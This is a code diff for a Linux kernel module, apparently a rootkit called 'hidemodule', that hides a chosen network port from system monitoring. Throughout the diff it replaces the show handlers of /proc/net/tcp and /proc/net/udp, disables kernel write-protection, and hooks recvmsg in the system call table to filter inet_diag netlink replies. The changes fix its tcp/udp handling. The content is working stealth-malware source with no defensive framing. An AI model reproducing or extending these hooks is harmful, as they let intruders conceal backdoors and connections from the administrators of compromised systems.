@@ -73,7 +73,10 @@ static int manipulated_tcp_show(struct seq_file* m, void *v)
 	struct inet_sock *inet;
 
 	if(SEQ_START_TOKEN == v)
+	{
 		return original_tcp_show(m,v);
+	}
+
 	sk = (struct sock *) v;
 	inet = inet_sk(sk);
 	port = ntohs(inet->inet_sport);
@@ -95,8 +98,9 @@ static int manipulated_udp_show(struct seq_file* m, void *v)
 
         if(SEQ_START_TOKEN == v)
 	{
-                return original_tcp_show(m,v);
+                return original_udp_show(m,v);
 	}
+
         sk = (struct sock *) v;
         inet = inet_sk(sk);
         port = ntohs(inet->inet_sport);
@@ -115,8 +119,7 @@ static int checkport(struct nlmsghdr *nlh)
 	struct inet_diag_msg *r = NLMSG_DATA(nlh);
     	int lport = ntohs(r->id.idiag_sport);
 	
-		
-	if(lport == port_number && strcmp(tlp_version, "tcp") == 0) // TODO: check if this works for udp too
+	if(lport == port_number && strcmp(tlp_version, "tcp") == 0)
 	{
 		printk("matched the version \n");
 		return 1;
@@ -238,14 +241,14 @@ static int __init hidemodule_init(void)
 	
 	while(proc && count<2)
 	{	
-		if(strcmp(proc->name, "tcp") == 0)
+		if(strcmp(proc->name, "tcp") == 0 && strcmp(tlp_version, "tcp") == 0)
 		{	
 			tcp_seq = proc->data;
 			original_tcp_show = tcp_seq->seq_ops.show;
 			tcp_seq->seq_ops.show = manipulated_tcp_show;
 			count++;
 		}
-		if(strcmp(proc->name, "udp") == 0)
+		if(strcmp(proc->name, "udp") == 0 && strcmp(tlp_version, "udp") == 0)
 		{
 			udp_seq = proc->data;
 			original_udp_show = udp_seq->seq_ops.show;
@@ -255,18 +258,22 @@ static int __init hidemodule_init(void)
 		proc = proc->next;
 	}
 
-        /* disable the write-protection */
-        disable_page_protection();
+	if(strcmp(tlp_version, "tcp") == 0)
+	{	
+        	/* disable the write-protection */
+        	disable_page_protection();
 
-        /*
-         * keep pointer to original function in original_socketcall, and
-         * replace the system call in the system call table with
-         * manipulated_socketcall
-         */
-        original_recvmsg = (void *)sys_call_table[__NR_recvmsg];
-	sys_call_table[__NR_recvmsg] =  (unsigned long*)manipulated_recvmsg;
-        /* reenable the write-protection */
-        enable_page_protection();
+        	/*
+       		 * keep pointer to original function in original_socketcall, and
+        	 * replace the system call in the system call table with
+       	 	 * manipulated_socketcall
+         	 */
+        	original_recvmsg = (void *)sys_call_table[__NR_recvmsg];
+		sys_call_table[__NR_recvmsg] =  (unsigned long*)manipulated_recvmsg;
+        
+		/* reenable the write-protection */
+        	enable_page_protection();
+	}
 
 	return 0;
 }
@@ -289,13 +296,13 @@ static void __exit hidemodule_exit(void)
 	
 	while(proc && count<2)
 	{
-		if (strcmp(proc->name, "tcp") == 0)
+		if(strcmp(proc->name, "tcp") == 0 && strcmp(tlp_version, "tcp") == 0)
 		{
             		tcp_seq = proc->data;
 	                tcp_seq->seq_ops.show = original_tcp_show;
             		count++;
         	}
-		if(strcmp(proc->name, "udp") == 0)
+		if(strcmp(proc->name, "udp") == 0 && strcmp(tlp_version, "udp") == 0)
 		{
 			udp_seq = proc->data;
 			udp_seq->seq_ops.show = original_udp_show;
@@ -305,15 +312,17 @@ static void __exit hidemodule_exit(void)
 		proc = proc->next;
 	}
 
-	
-	/* disable the write-protection */
-        disable_page_protection();
+	if(strcmp(tlp_version, "tcp") == 0)
+	{	
+		/* disable the write-protection */
+        	disable_page_protection();
 
-        /* Return the system call back to original */
-        sys_call_table[__NR_recvmsg] = (unsigned long *)original_recvmsg;
+        	/* Return the system call back to original */
+        	sys_call_table[__NR_recvmsg] = (unsigned long *)original_recvmsg;
 	
-        /* reenable the write-protection */
-        enable_page_protection();
+        	/* reenable the write-protection */
+        	enable_page_protection();
+	}
 }
 
 module_init(hidemodule_init);
